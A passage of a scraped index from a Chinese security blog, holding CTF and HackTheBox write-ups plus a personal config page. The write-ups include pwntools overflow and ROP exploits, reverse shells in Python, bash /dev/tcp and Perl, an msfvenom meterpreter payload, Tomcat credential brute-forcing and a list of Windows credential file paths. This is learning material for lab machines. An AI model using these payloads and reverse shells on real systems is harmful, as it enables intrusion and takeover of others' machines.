$_GET['debu'] !== 'aqua_is_cute') { $file = $_GET[\"file\"]; echo \"Neeeeee! Good Job!\"; } 因为正则没有/g, 添加一个%0a就可以绕过了 绕过 123456if($_REQUEST) { foreach($_REQUEST as $value) { if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); }} 这里的话是利用 POST 参数来覆盖 GET 参数, 我们知道 POST 和 GET 的参数是分别放在不同的数组的, 但是在$_REQUEST中, 是合并在一起的, 并且优先级如下 1GETb.txt\")); 第二篇结束了, 后面尽量刷一些质量更高的题吧 本文作者: cjm00n本文地址: https://cjm00n.top/CTF/BuuCTF刷题记录2.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/CTF/BuuCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952.html"},{"title":"CSRF学习之旅","text":"看了 p 神知识星球最近关于校招知识点的整理, 于是想对 CSRF 做一些知识性的总结和学习 😄 更新中 题目CSRF 相关的内容, 域的概念, 跨域的方法, CSRF 防御的各种方法对比, Same_site Cookie 概念实战参考 前端安全系列之二：如何防止 CSRF 攻击 本文作者: cjm00n本文地址: https://cjm00n.top/Web/CSRF学习之旅.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/Web/CSRF%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85.html"},{"title":"Config文档","text":"记录下常用的配置 git proxy让 git 走代理, 基本可以达到满速 1git config --global http.https://github.com.proxy socks5h://127.0.0.1:10808 删除代理 1git config --global --unset http.https://github.com.proxy zsh12apt install zshsh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" zshrc12345678910111213# themeZSH_THEME=\"ys\"# aliasalias ctf=\"cd /mnt/hgfs/ctf\"alias tools=\"cd /mnt/hgfs/tools\"alias clash=\"~/clash/clash -d ~/clash/\"alias htbvpn=\"openvpn ~/cjM00N.ovpn\"alias pc=\"proxychains\"alias tmuxa=\"tmux a -t\"alias tmuxn=\"tmux new -s\"alias vi=\"vim\"alias burp=\"/opt/Burpsuite/start.sh\" 内外网切换12345netstat -nr 查看路由表sudo route delete 0.0.0.0 删除默认路由sudo route add -net 0.0.0.0 192.168.1.1 默认使用192.168.1.1网关sudo route add 10.200.0.0 10.200.22.254 有线网卡使用该网关sudo route add 10.0.1.0/24 10.200.22.254 其它网段指定网关 切换 java 版本1update-alternatives --config java tmux 配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# reload with Ctrl+rbind C-r source-file ~/.tmux.conf \\; display \"Reloaded!\"# tmux attachnew-session# vi keymapset-option -g status-keys viset-window-option -g mode-keys vi# vi-type selection and copybind -T copy-mode-vi v send-keys -X begin-selectionbind -T copy-mode-vi y send-keys -X copy-selection-and-cancel# choose pane with vi-keybind -r ^k selectp -Ubind -r ^j selectp -Dbind -r ^h selectp -Lbind -r ^l selectp -R# exec command manbind m command-prompt \"splitw -h 'exec man %%'\"# add Ctrl+a to prefix keyset -g prefix2 C-abind C-a send-prefix -2# new pane - =# horizontalunbind '\"'bind - splitw -v -c '#{pane_current_path}'# verticalunbind %bind = splitw -h -c '#{pane_current_path}'# colorset -g default-terminal \"screen-256color\"# renamesetw -g automatic-rename offsetw -g allow-rename off# mouseset -g mouse on# ------ status theme -------------------------------set -g message-style \"bg=#00346e, fg=#ffffd7\" # tomorrow night blue, base3set -g status-style \"bg=#00346e, fg=#ffffd7\" # tomorrow night blue, base3set -g status-left \"#[bg=#0087ff] > #S \" # blueset -g status-left-length 400set -g status-right \"#[bg=#0087ff] #(whoami)@#h #[bg=red] %Y-%m-%d %H:%M \"set -g status-right-length 600set -g set-clipboard onset -g history-limit 8000set -wg window-status-format \" #I #W \"set -wg window-status-current-format \" #I #W \"set -wg window-status-separator \"\"set -wg window-status-current-style \"bg=red\" # redset -wg window-status-last-style \"fg=#dddddd\"set -wg pane-active-border-style \"fg=blue\"set -wg pane-border-style \"fg=#585858\" # base01set -g status-justify left powershell 设置别名打开配置文件 1code $PROFILE 设置别名样例如下 1234function cdTools{ Set-Location D:\\tools}Set-Alias tools cdTools 重启 powershell 即可如果是带参数的命令, 则可以通过$args来获取, 例如自动新建并打开 md 12345function newPost{ cdBlog hexo new \"$args\" code D:\\CTF\\blog\\source\\_post\\$args.md} 这里没有处理对于文件名的转换问题, 比如空格, 特殊符号等 整理如下 1234567891011121314151617181920212223242526function cdBlog{ Set-Location D:\\CTF\\blog}function cdTools{ Set-Location D:\\tools}function cdCTF { Set-Location D:\\CTF}function cdDownload { Set-Location D:\\xxx\\Downloads}function exThere { explorer.exe .}function pushBlog { cdBlog hexo clean; hexo d -g;}Set-Alias blog cdBlogSet-Alias tools cdToolsSet-Alias ctf cdCTFSet-Alias down cdDownloadSet-Alias ex exThereSet-Alias hexod pushBlog 本文作者: cjm00n本文地址: https://cjm00n.top/Linux/Config文档.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/Linux/Config%E6%96%87%E6%A1%A3.html"},{"title":"Buu刷题记录3","text":"更新中 [ISITDTU 2019]EasyPHP先看源码 index.php123456789101112 ret 也就是-0x80-0x8, payload 如下 12345678from pwn import *io = remote(\"node3.buuoj.cn\",26279)io.recvline()payload = b\"a\" * 0x88payload += p64(0x400596)io.send(payload)io.interactive() jarvisoj_level1 可以看到没有开NX堆栈保护, main 函数如下 跟进vulenrable_function 这次没有了后门函数, 但是 NX 保护没开, 就可以将 shellcode 写入堆栈, 再将地址指向堆栈上 shellcode 的地址, 就可以执行了, buf 的大小为0x8c 想法是很美好的, buuoj 上面却一直打不通, 感觉上面的文件和给的附件不一样, 打了一下 jarvisoj 的可以通 123456789101112131415from pwn import *io = remote(\"node3.buuoj.cn\",27940)# io = remote(\"pwn2.jarvisoj.com\",\"9877\")context.log_level = 'debug'addr = int(io.recvline()[len(\"What's this:\"):-2],16)print(addr)shellcode = asm(shellcraft.sh())# shellcode=b\"\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xb0\\x0b\\xcd\\x80\"payload = shellcodepayload += \"a\" * (0x8c - len(shellcode))payload += p64(addr)io.send(payload)io.interactive() 看了下南梦师傅的 exp, 不是很懂, 后面再研究看看, 菜鸡 pwn 手的心理受到了巨大的创伤 jarvisoj_level2学习了一下南梦师傅的 exp 写法, 这题其实就是找system然后执行就可以了 或者这里 exp 如下 1234567891011121314151617181920212223242526from pwn import *context.log_level = 'debug'context.arch = 'i386'elf = ELF(\"./level2\")sh = 0lib = 0def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level2\") else: sh = remote(ip, port) bin_sh_addr = elf.search(\"/bin/sh\").next() # system_addr = elf.[\"system\"] system_addr = 0x804849E # print(bin_sh_addr) print(system_addr) payload = \"a\" * (0x88 + 0x4) payload += p32(system_addr) payload += p32(bin_sh_addr) sh.send(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 26653, 0) jarvisoj_level2_x6432 位和 64 位在函数传参的地方有所不同, 64 位前 6 个参数是放在寄存器上, 第一个是rdi, 所以我们要想办法把/bin/sh传入 rdi, 这里需要用到ROPgadget 可以看到程序找到了一些可用的汇编语句, 我们先来看一下红框中的语句 1pop rdi ; ret pop rdi: 将栈顶的数据弹出, 传给 rdi ret: 将栈顶的数据弹出, 跳转到该地址 我们依次传入/bin/sh和system的地址, 栈上的状态如下 12/bin/shsystem 那么我们就可以顺利的将 rdi 加载为/bin/sh 构造 exp 如下 12345678910111213141516171819202122232425from pwn import *context.log_level = 'debug'context.arch = 'amd64'elf = ELF(\"./level2_x64\")sh = 0lib = 0def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level2_x64\") else: sh = remote(ip, port) pop_rdi_ret_addr = 0x4006b3 bin_sh_addr = elf.search(\"/bin/sh\").next() system_addr = 0x400603 payload = \"a\" * (0x88) payload += p64(pop_rdi_ret_addr) payload += p64(bin_sh_addr) payload += p64(system_addr) sh.send(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 25012, 0) jarvisoj_level3 看一下vuln函数 这次开启了 NX 保护, 也没有后门函数, 就只能去 libc 里面找了 但是这里坑的地方就是, 我去翻了题目 github 地址的 libc 是2.19, 实际上并不是, 然后就一直time_out… 我们想要利用 libc 中自带的函数, 需要先找到基址, 而write函数就可以用来泄露地址, 然后与我们本地的相减就能求出基址, 就可以实现任意调用了 libc 的部分参考网上的 wp 使用了LibcSearcher来找, 就很顺利了 hhh exp 如下 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *from LibcSearcher import *context.log_level = 'debug'context.arch = 'i386'elf = ELF(\"./level3\")sh = 0# lib = ELF(\"./libc-2.19.so\")def exp(ip, port, debug=0): global sh if debug: sh = process(\"./level3\") else: sh = remote(ip, port) # leak write payload = \"a\" * (0x88 + 0x4) payload += p32(elf.plt['write']) payload += p32(0x8048495) # vuln payload += p32(0x1) payload += p32(elf.got['write']) payload += p32(0x4) sh.recvuntil(\"Input:\\n\") sh.send(payload) write_addr = u32(sh.recv(4)) # calc system & /bin/sh lib = LibcSearcher(\"write\", write_addr) image_base = write_addr - lib.dump(\"write\") system_addr = image_base + lib.dump(\"system\") bin_sh_addr = image_base + lib.dump(\"str_bin_sh\") # getshell payload = \"a\" * (0x88 + 0x4) payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(bin_sh_addr) sh.recvuntil(\"Input:\\n\") sh.sendline(payload) sh.interactive()if __name__ == '__main__': exp(\"node3.buuoj.cn\", 25297, 0) pwn 的快乐暂时到这里了, 后面有空再玩一下 [BSidesCF 2019]Mixer这道题挺巧妙的, 如果看过 WP 的话可以知道这是 AES 的 ECB 翻转攻击 首先要打开 burp 的这个设置 这样方便我们跟随跳转而不用手动设置 cookie 登录后可以看到多了一个 user 的 cookie, 并且提示说 1And you can safely ignore the rack.session cookie. Like actually. But that other cookie, however.... (中间省略一堆日 cookie 的时间) 我们先随便改一位试试 发现报错, 是一个 json 的解密, 乱码的只有我们修改的那个块, 可以推测是 ECB 加密, 如果是 CBC 的话, 前面也会变成乱码 我们知道 ECB 加密是 16 位一组, 并且每组互相独立, 加密后为 32 位, 而这里的目标是让is_admin变成 1, 单纯的翻转的话不太好操作, 毕竟我们不知道 IV, 但是在 json 中 11.0 = 1 那如果我们构造刚好 16 位, 也就是1.00000000000000, 使得这个块独立加密, 然后再放到is_admin中, 就可以将is_admin变成1了 先写出 json 1{\"first_name\":\"\",\"last_name\":\"\",\"is_admin\":} 观察到前面的 1{\"first_name\":\" 总共 15 位, 加上一位就可以变成 16 位, 即这样 1{\"first_name\":\"A1.00000000000000\",\"last_name\":\"\",\"is_admin\":} 就可以顺利获取我们需要的1.00000000000000的加密块了 再观察后面, 使得 1\",\"last_name\":\"\",\"is_admin\": 为 16 的整数倍, 中间需要填充 4 个字符, 也就是 1{\"first_name\":\"A1.00000000000000\",\"last_name\":\"A333\",\"is_admin\":} 那么这个 json 会被分为 5 个部分加密 12345{\"first_name\":\"A1.00000000000000\",\"last_name\":\"A333\",\"is_admin\":} 其中最后一个块会被填充到 16 位, 我们首先将上面的 json 以 get 方式提交 1/?action=login&first_name=A1.00000000000000&last_name=A333 然后获取 cookie 12a3a97a1e1a60d30206bd0710c7d6436c21965416ed467e21d650a0e019b68eff2c3b097feb7610eb39b30a3bddadcd1967867848b5b83d2629292395c9af2835c8ac8596bd3f958383991f95d145726 33-64位, 添加到最后的32位之前 12a3a97a1e1a60d30206bd0710c7d6436c21965416ed467e21d650a0e019b68eff2c3b097feb7610eb39b30a3bddadcd1967867848b5b83d2629292395c9af283c21965416ed467e21d650a0e019b68ef5c8ac8596bd3f958383991f95d145726 就可以看到 flag 了 [BSidesCF 2019]Futurella 看到奇怪的东西, 还以为是在做 misc, 实际上真的是 misc 签到题了解一下 [BSidesCF 2019]SVGMagic原来这题是要看图片的… svg 其实就是 xml, 所以还是 xxe, 不过我一直以为解码 base64 就会看到, 直到我打开了图片 hhh 后面就随便读了 [BSidesCF 2019]FlagSrv本文作者: cjm00n本文地址: https://cjm00n.top/CTF/Buu刷题记录3.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/CTF/Buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953.html"},{"title":"HTB-Hack之旅","text":"我 tcl MachinesBashed难度是 ctf 中的白给题 打开界面如下 点击 phpbash 后会跳转到 github, 可以看到源码如下 123456if (ISSET($_POST['cmd'])) { $output = preg_split('/[\\n]/', shell_exec($_POST['cmd'].\" 2>&1\")); foreach ($output as $line) { echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . \"\"; } die(); 可以看到直接将命令传入 shell, 不过有个2>&1, 会使得一些 shell 命令不执行 这里是根据 wp 一步一步做的, 首先看一下 nmap 1nmap -sC -sV -oA nmap/init 10.10.10.68 nmap 的命令可以参考 https://github.com/erasin/notes/blob/master/linux/safe/nmap.md -sC: 等价于 –script=default, 使用默认类别的脚本进行扫描 -sV: 指定让 Nmap 进行版本侦测 -oA: 输出至所有格式 可以看到结果如下 然后探测一下目录 1gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 结果如下 访问一下分别得到 123/dev/phpbash.php/php/sendmail.php/uploads/ (NULL) 然后可以通过phpbash来直接执行命令, 首先传一个LinEnum.sh查看一下系统的敏感信息 123456# localpython -m SimpleHTTPServer 8000# remotecd uploadswget http://ip:8000/LinEnum.shbash LinEnum.sh 结果如下 12345678910[00;31m[-] Super user account(s):[00mroot[00;33m[+] We can sudo without supplying a password![00mMatching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL 看到有个无密码的账号scriptmanager 那我们再反弹个 shell, 可以使用系统自带的 php 文件 1/usr/share/webshells/php/php-reverse-shell.php 修改 ip 和端口后, 在 uploads 写入 1wget http://ip:8000/php-reverse-shell.php 然后访问就可以拿到 shell 了 再利用附录的升级方法即可获得交互 shell, 然后登录进scriptmanager 1su -u scriptmanager bash 可以在/下看到有个scripts文件夹, 访问之, 下面有个 root 权限的文件 如果可以看到test.py的原内容的话, 他其实是修改了test.txt, 这就说明test.py的执行其实是由 root 执行的, 但是我们可以写, 那就将内容改为反弹 shell 1234567import socket,subprocess,os,ptys=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"ip\",port))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)pty.spawn(\"/bin/bash\") 然后本地监听即可 1nc -lvvp 2334 成功获取 root 权限 Lame首先进行全面的扫描 1nmap –T4 –A –v targethost -T4: T 表示速度(0-5), 值越大则越快 -v: 显示冗余信息 -A: 进攻性的扫描 扫描结果如下, 可以看到有 21 和 139 和 445 应该是可以打的 尝试了一下 21 端口的 vsftpd 2.3.3 还真的没打通—, wp 诚不欺我 1explort/unix/ftp/vsftpd_234_backdoor 老老实实跟着 wp 打 1234search CVE-2007-2447use exploit/multi/samba/usermap_scriptset RHOSTS 10.10.10.3run 然后就是 root 了 Legacy跟前一题很像, 还是 nmap 开局 1nmap -T2 -A -v -oA nmap/init 10.10.10.3 xp 的机器, 开了 smb, 这里可以用MS-08-067来打 理想是丰满的, 这一步我卡了很久很久(国内网络太差了) Jerry1nmap -sC -sV -oA nmap/init 10.10.10.95 8080开放, 访问它, gogo 可以看到是默认的 tomcat 页面, 有三个选项 server status: admin:admin可以直接访问, 但是没啥用, 查看另外两个, admin 无法登陆, 使用 hydra 爆破 这里其实账号和密码都是明文的, 但是一般还是不会直接给出的, 所以这里还是按照 wp 的步骤爆破 12apt install seclistshydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html admin:admin不成功, 但是不知道为啥 hydra 给出来了, 我们这里使用tomcat:s3cret登录 登录进来后有了部署权, 可以传 jsp 马来 getshell 首先使用msfvenom创建一个反弹 shell 的 war 马 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=2334 -f war -o jerry.war 然后查看一下包里面的 jsp 文件地址 12mkdir tmpcd tmp && unzip ../jerry.war 再部署到 tomcat 上面, 本地 msf 监听一下 123456msfdb runuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset LHOST tun0set LPORT 2334run # run -j 后台启动 访问 tomcat 上面的地址, 就可以在本地接到 shell 了, 下面是 flag ippsec 的视频做的真的好, 强烈建议看一看 Netmon1nmap -sC -sV -oA nmap/init 10.10.10.152 可以看到有 ftp 服务, 连上去康康 123ftp 10.10.10.152# user: Anonymous# pwd: Anonymous 登录之后可以拿到用户的 flag 继续进行信息搜集, 我们可以根据下面的字典进行探测 https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768C:/Users/Administrator/NTUser.datC:/Documents and Settings/Administrator/NTUser.datC:/apache/logs/access.logC:/apache/logs/error.logC:/apache/php/php.iniC:/boot.iniC:/inetpub/wwwroot/global.asaC:/MySQL/data/hostname.errC:/MySQL/data/mysql.errC:/MySQL/data/mysql.logC:/MySQL/my.cnfC:/MySQL/my.iniC:/php4/php.iniC:/php5/php.iniC:/php/php.iniC:/Program Files/Apache Group/Apache2/conf/httpd.confC:/Program Files/Apache Group/Apache/conf/httpd.confC:/Program Files/Apache Group/Apache/logs/access.logC:/Program Files/Apache Group/Apache/logs/error.logC:/Program Files/FileZilla Server/FileZilla Server.xmlC:/Program Files/MySQL/data/hostname.errC:/Program Files/MySQL/data/mysql-bin.logC:/Program Files/MySQL/data/mysql.errC:/Program Files/MySQL/data/mysql.logC:/Program Files/MySQL/my.iniC:/Program Files/MySQL/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/data/hostname.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.logC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.logC:/Program Files/MySQL/MySQL Server 5.0/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/my.iniC:/Program Files (x86)/Apache Group/Apache2/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/access.logC:/Program Files (x86)/Apache Group/Apache/conf/error.logC:/Program Files (x86)/FileZilla Server/FileZilla Server.xmlC:/Program Files (x86)/xampp/apache/conf/httpd.confC:/WINDOWS/php.iniC:/WINDOWS/Repair/SAMC:/Windows/repair/systemC:/Windows/repair/softwareC:/Windows/repair/securityC:/WINDOWS/System32/drivers/etc/hostsC:/Windows/win.iniC:/WINNT/php.iniC:/WINNT/win.iniC:/xampp/apache/bin/php.iniC:/xampp/apache/logs/access.logC:/xampp/apache/logs/error.logC:/Windows/Panther/Unattend/Unattended.xmlC:/Windows/Panther/Unattended.xmlC:/Windows/debug/NetSetup.logC:/Windows/system32/config/AppEvent.EvtC:/Windows/system32/config/SecEvent.EvtC:/Windows/system32/config/default.savC:/Windows/system32/config/security.savC:/Windows/system32/config/software.savC:/Windows/system32/config/system.savC:/Windows/system32/config/regback/defaultC:/Windows/system32/config/regback/samC:/Windows/system32/config/regback/securityC:/Windows/system32/config/regback/systemC:/Windows/system32/config/regback/softwareC:/Program Files/MySQL/MySQL Server 5.1/my.iniC:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xmlC:/Windows/System32/inetsrv/config/applicationHost.configC:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log 接下来需要获取 root 权限, 先离开 ftp 看看其他的端口, 个人信息1234# ip10.10.14.10# bashbash -i >& /dev/tcp/10.10.14.10/2333 0>&1 交互式 shell半交互式12# python ptypython -c 'import pty;pty.spawn(\"/bin/bash\")' 此时可以实现简单的交互, 处于半交互状态, 但是不能用 vim 这种命令 交互式首先将 shell 放到后台 1ctrl + z 然后执行 1stty raw -echo 接着使用 fg 将 shell 返回前台 1fg 现在的 shell 看起来会比较奇怪, 使用 reset 1reset 再导入如下配置即可 123export SHELL=bashexport TERM=xterm256-colorstty rows 24 columns 80 吐槽一下为啥进入交互式后 shell 特别卡—- ### 参考资料 https://bbs.ichunqiu.com/thread-54982-1-1.html 本文作者: cjm00n本文地址: https://cjm00n.top/Pentest/HTB-Hack之旅.html 版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","link":"/Pentest/HTB-Hack%E4%B9%8B%E6%97%85.html"},{"title":"V&N公开赛2020 writeup","text":"给赵师傅递茶, AK 是不可能 AK 的 checkin首先是签到题, 先看一下代码 123456789101112131415161718192021222324252627from flask import Flask, requestimport osapp = Flask(__name__)flag_file = open(\"flag.txt\", \"r\")# flag = flag_file.read()# flag_file.close()## @app.route('/flag')# def flag():# return flag## want flag? naive!# You will never find the thing you want:) I think@app.route('/shell')def shell(): os.system(\"rm -f flag.txt\") exec_cmd = request.args.get('c') os.system(exec_cmd) return \"1\"@app.route('/')def source(): return open(\"app.py\",\"r\").read()if __name__ == \"__main__\": app.run(host='0.0.0.0') 首先可以明确, 在我们执行命令的时候这个flag.txt已经被删了, 不存在什么条件竞争的 而我们观察一下程序的步骤 123flag_file = open(\"flag.txt\", \"r\")....os.system(\"rm -f flag.txt\") 第一步先打开了文件, 然后再对文件删除, 看到这个就想起了一个远古的知识点, 我也不记得是学什么看到的了 https://blog.csdn.net/wyzxg/article/details/12654639 当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里, 而具体的位置在 1/proc//fd/ 下面用本地的例子举例 首先创建flag.txt 然后运行 1python app.py 之后我们访问shell, 就可以看到文件已经被删除了 如何找到文件在内存中的位置呢, 利用lsof 1lsof|grep flag.txt 其中第二列的3512就是 在程序中打开 12cd /proc/3512/fdls -al 可以看到 3 就是我们需要的文件, 直接cat即可 不过这里有两个问题, 首先是如何反弹 shell 在做题的时候发现 (使用内网的linux labs), 在环境中执行 1curl http://ip:port 却不能监听到访问, 一度怀疑不在内网, 还重开了两次 (错失一血 hhh 这里歪个楼, 在出题人的环境配置不对的情况下, 我们可以通过 1ls|base64>>app.py 的方式来写入 app.py, 从而不用反弹 shell 也可以看到回显, 当然赵师傅没留下这个机会(x 上网搜了很多个反弹 shell 的 payload http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html 最后找到一个能用的 1perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"ip:port\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while;' 然后成功返回 shell, 但是发现第二个问题, 上面没有lsof, ps也没有反应 进去 1cd /proc/ 看了一下, 发现只有几个, 就直接遍历一下 hhhh 很快就能看到了 TimeTravel代码很简洁, 很赵师傅 12345678910111213141516171819202122232425get('http://127.0.0.1:5000/api/eligible'); $content = $response->getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) { echo system('/readflag'); }}if(isset($_GET['file'])) { highlight_file($_GET['file']);}if(isset($_GET['phpinfo'])) { phpinfo();} 我们先看熟悉的部分, 下面可以看到有读文件和phpinfo的地方, 我们就先看phpinfo 没有什么有意思的地方( 大概 然后我们就读文件吧, 这种程序的结构和 tp 很像, 我们首先读一下 1composer.json 可以明确的是, 程序代码这么少, 肯定是组件洞, 总不能一个highlight_file就能 RCE 是吧 hhhh 但是不急, 继续读一读, 我很好奇中间的这个 1http://127.0.0.1:5000/api/eligible 是什么, 这个怎么读呢, 我们知道 docker 一般会有个start.sh, 经常会在根目录或者/tmp或者~, 试一下就会发现在根目录 然后就能看到程序的路径, 读一下 1/srv/app.py 这里题目已经很明确了, 只要等到 2050 年就可以拿到 flag, 因此这里我就等了 (xxx 读完了源码我们去看看原来的那个组件的版本, 有没有什么漏洞 搜一下很快就会发现下面这些东西 https://httpoxy.org/ https://www.laruence.com/2016/07/19/3101.html 就是说这个程序会将请求头中的 1PROXY:ip:port 注册为全局变量, 类似于 1http_proxy=ip:port command 所以我们只需要劫持一下返回即可 在Linux labs里面, 先建一个index.php 1234true); header(\"Content-Type:application/json\"); echo json_encode($arr); 然后运行 1php -S 0:2333 有师傅后面问到, 这里提一下, 代理并不需要和原来的端口以及路径一致, 只需要给一个合适的返回就可以了, 而这个命令是启动 php 内置的一个 web 服务器, 如果文件名为index.php 我们可以通过 1http://ip:port/ 来访问, 如果是其他的命名则需要 1http://ip:port/filename.php 这样来访问, 因此这里必须要设置为index.php 后面加上请求头访问即可 HappyCTFd看到就猜是 CTFd 的漏洞了, 毕竟前段时间刚爆了一个 https://www.colabug.com/2020/0204/6940556/ 大概就是说, 在忘记密码验证的时候, 会对用户名进行 1strip() 的操作, 那么我们只需要注册一个 1admin 的账号, 然后忘记密码即可接管管理员的账号(需要使用内网邮件系统) 这个就不演示了, 登录后可以进去管理界面, 搭过 CTFd 的应该都知道, 他里面有一个 1Backup 的功能, 会把所有的记录备份下来, 我们直接用它下载全部内容 就可以看到 flag 了 EasySpringMVC是个 java 题, 人生第一个正经 java 题, 然而没做出来— 先看一下代码, 我们可以使用jd-gui打开这个 war 包 看一眼web.xml 看不出啥有用的, 就去翻代码, 为了好看一点我复制出来在 vscode 看了 在 1WEB-INF\\classes\\com\\filters\\ClientInfoFilter.java 可以看到有这段, 明显是一个反序列化构造, 可以伪造 cookie 变成管理员 编写 exp 如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.*;import java.util.Base64;import com.tools.*;public class test { public static void main(String[] args) { Base64.Encoder encoder = Base64.getEncoder(); try { ClientInfo cinfo = new ClientInfo(\"admin\", \"webmanager\", \"CC79398F535DB34F13B667D3C079BF00\"); byte[] bytes = Tools.create(cinfo); String payload = encoder.encodeToString(bytes); System.out.println(payload); } catch (Exception e) { e.printStackTrace(); } }}class Tools implements Serializable { private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } private String testCall; public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[]) obj)).start(); }} 还需要把ClientInfo类放在 1com/tools/ClientInfo.java 把构造类的第三个参数设置为你的 SESSIONID 即可 运行后将输出的 base64 填到 cookie 就可以了 然后我们就能获得文件上传的机会, 但是问题就在这里, 我经过很多次尝试 发现只能上传在 1/tmp 目录下 其他的目录就会permission denied 而我们的调用是这样的 12345678910111213141516171819202122232425262728293031public class PictureController{ @RequestMapping({\"/showpic.form\"}) public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception { if (file == null) file = \"showpic.jsp\"; String[] attribute = file.split(\"\\\\.\"); String suffix = attribute[attribute.length - 1]; if (!suffix.equals(\"jsp\")) { boolean isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute(\"cinfo\")).getName().equals(\"admin\"); if (!isadmin && (!suffix.equals(\"jpg\") || !suffix.equals(\"gif\"))) { return \"onlypic\"; } show(httpServletRequest, httpServletResponse, file); return \"showpic\"; } StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i < attribute.length - 1; i++) { stringBuilder.append(attribute[i]); } String jspFile = stringBuilder.toString(); int unixSep = jspFile.lastIndexOf('/'); int winSep = 